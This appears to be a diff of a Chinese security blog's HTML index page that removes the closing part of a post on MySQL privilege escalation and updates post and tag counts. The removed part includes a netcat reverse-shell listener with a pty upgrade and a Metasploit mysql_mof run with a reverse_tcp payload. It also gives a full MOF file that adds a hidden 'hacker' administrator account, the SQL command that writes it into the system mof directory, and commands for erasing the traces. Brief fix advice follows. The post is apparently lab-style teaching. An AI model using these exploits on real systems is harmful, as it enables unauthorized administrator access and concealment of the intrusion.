-<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/13.jpg"></p>
-<p>开启本地监听，back.php文件运行后shell会成功反弹。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 监听端口</span></span><br><span class="line">nc -lvnp 6666</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 得到交互式shell:</span></span><br><span class="line">python -c ’import pty; pty.spawn(&quot;/bin/bash&quot;)’</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x03-MOF提权"><a href="#0x03-MOF提权" class="headerlink" title="0x03 MOF提权"></a>0x03 MOF提权</h1><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>MOF(托管对象格式)是windows系统C:/Windows/system32/wbem/mof/nullevt.mof文件，其作用是每间隔5秒就监听进程的创建和死亡。</p>
-<p>如果通过mysql使用load_file将文件写入/wbom/mof。mof中有vbs脚本，可以通过控制脚本内容让系统执行命令来提权。</p>
-<h3 id="2-条件"><a href="#2-条件" class="headerlink" title="2.条件"></a>2.条件</h3><ul>
-<li><p>windows03及以下版本</p>
-</li>
-<li><p>mysql有读写C:/Windows/system32/wbem/mof的权限</p>
-</li>
-<li><p>secure-file-priv参数不为null</p>
-</li>
-</ul>
-<p>msf也自带mof提权模块，且可自动清理痕迹</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置payload</span></span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标 MySQL 的基础信息</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.127.132</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p>mof脚本内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  &#x3D; &quot;filtP2&quot;; </span><br><span class="line">    Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second &#x3D; 5&quot;; </span><br><span class="line">    QueryLanguage &#x3D; &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name &#x3D; &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine &#x3D; &quot;JScript&quot;; </span><br><span class="line">    ScriptText &#x3D; </span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd &#x2F;add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker &#x2F;add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   &#x3D; $Consumer; </span><br><span class="line">    Filter &#x3D; $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>其中核心payload为：</p>
-<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var WSH = <span class="keyword">new</span> ActiveXObject(\<span class="string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>将test.mof写入mof目录下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select load_file(&#39;C:&#x2F;Documents and Settings&#x2F;test.mof&#39;)into dumpfile &quot;C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;test.mof&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>执行成功test.mof 会出现在：c:/windows/system32/wbem/goog/ 目录下 ,否则在 c:/windows/system32/wbem/bad 目录下</p>
-<p>痕迹清理：</p>
-<p>每隔几分钟会重新执行添加用户的命令，所以想清理痕迹得先暂时关闭 winmgmt 服务再删除mof 文件，此时删除用户才有效果。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 停止 winmgmt 服务</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 Repository 文件夹</span></span><br><span class="line"><span class="built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动删除 mof 文件</span></span><br><span class="line"><span class="built_in">del</span> C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除创建的用户</span></span><br><span class="line">net user hacker /delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动服务</span></span><br><span class="line">net <span class="built_in">start</span> winmgmt</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="0x04-漏洞修复："><a href="#0x04-漏洞修复：" class="headerlink" title="0x04 漏洞修复："></a>0x04 漏洞修复：</h1><p>MySQL数据库更新到最新版本<br>禁止除白名单外其他ip远程登录MySQL数据库<br>修改数据库用户名</p>
-<p>思考：</p>
-<p>记得是python3跑脚本，不然会遇到python包已安装，但还是找不到的问题。Linux权限管理比Winodws严格，Linux分root用户，组用户和其他用户，然而windows就只有user和administrator。</p>
-<p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://my.oschina.net/bylibrary/blog/4967585">https://my.oschina.net/bylibrary/blog/4967585</a></p>
-<p><a target="_blank" rel="noopener" href="https://yeasy.gitbook.io/docker_practice/container">https://yeasy.gitbook.io/docker_practice/container</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a4f25b2d74e6">https://www.jianshu.com/p/a4f25b2d74e6</a> </p>
-<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a> </p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yatere/article/details/7654057">https://blog.csdn.net/yatere/article/details/7654057</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/15321f9ede38">https://www.jianshu.com/p/15321f9ede38</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.xiaoheidiannao.com/8682.html">https://www.xiaoheidiannao.com/8682.html</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1884,7 +1824,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1893,7 +1833,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">45</span>
+        <span class="site-state-item-count">46</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
